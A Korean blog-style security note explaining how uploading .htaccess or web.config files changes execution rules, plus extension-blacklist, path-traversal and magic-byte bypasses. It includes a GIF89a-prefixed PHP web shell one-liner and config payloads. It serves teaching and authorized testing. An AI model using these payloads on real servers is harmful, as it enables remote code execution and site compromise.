---
title: "업로드 설정 덮어쓰기 (Upload Config Override)"
date: 2026-10-15 09:00:00 +0900
categories: [Web Security, File Upload]
tags: [file-upload, htaccess, web-config, web]
description: "업로드로 서버 설정 파일(.htaccess·web.config)을 올려 실행 규칙을 바꾸거나 확장자 블랙리스트·시그니처를 우회하는 기법의 개념과 구문을 정리합니다."
mermaid: true
---

> 기본 개념은 [파일 업로드 취약점](/notes/file-upload-vulnerability/)에서 다뤘다. 이 글은 업로드로 **서버 설정 자체를 바꿔** 실행 제한을 푸는 특수 케이스와, 확장자·시그니처 우회의 변형을 본다.

## 개념

실행 확장자(`.php`·`.jsp`)가 차단돼도, 업로드 폴더에 **서버 설정 파일**을 올리면 그 폴더의 처리 규칙을 바꿀 수 있다. Apache는 `.htaccess`, IIS는 `web.config`로 "이 확장자를 스크립트로 실행하라"고 지시할 수 있다. 설정을 바꾼 뒤 무해해 보이는 확장자로 올린 파일이 실행된다.

```apache
# 업로드한 .htaccess — .png 를 PHP로 실행하게 함
AddType application/x-httpd-php .png
```

## 공격·우회 구문

허가된 범위에서만.

### 설정 파일 업로드

```apache
# .htaccess (Apache)
AddType application/x-httpd-php .pwn
# 또는: AddHandler php-script .pwn  /  SetHandler application/x-httpd-php
```
```xml
<!-- web.config (IIS) -->
<configuration><system.webServer><handlers>
 <add name="x" path="*.pwn" verb="*" scriptProcessor="...php-cgi.exe" resourceType="Unspecified"/>
</handlers></system.webServer></configuration>
```

### 확장자 블랙리스트 우회

```
대체 실행 확장자: .php5 .phtml .pht .phar .inc / .asp;.jpg / .jspx .jsw
대소문자·끝 문자: shell.PHP / shell.php. / shell.php%20 / shell.php::$DATA
이중 확장자: shell.php.jpg (서버가 .php 로 해석하는 설정)
경로: filename="../shell.php" (업로드 경로 탈출)
```

### Content-Type·시그니처 위조

```
Content-Type: image/png 로 바꾸고 내용은 스크립트
매직바이트 선두에: GIF89a; <?php system($_GET['c']);?>
PNG/JPEG 헤더 뒤에 코드 삽입(파서가 앞부분만 검사 시)
다형성 파일(polyglot): 유효한 이미지이면서 유효한 스크립트
```

### 확인 요령

```
업로드 응답이 실패로 보여도 '저장 경로를 직접' 접근해 실행되는지 확인
업로드 폴더에 설정 파일이 허용되는지, 그 폴더가 실행 가능 설정인지
```

## 참고 자료

- [OWASP File Upload Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)
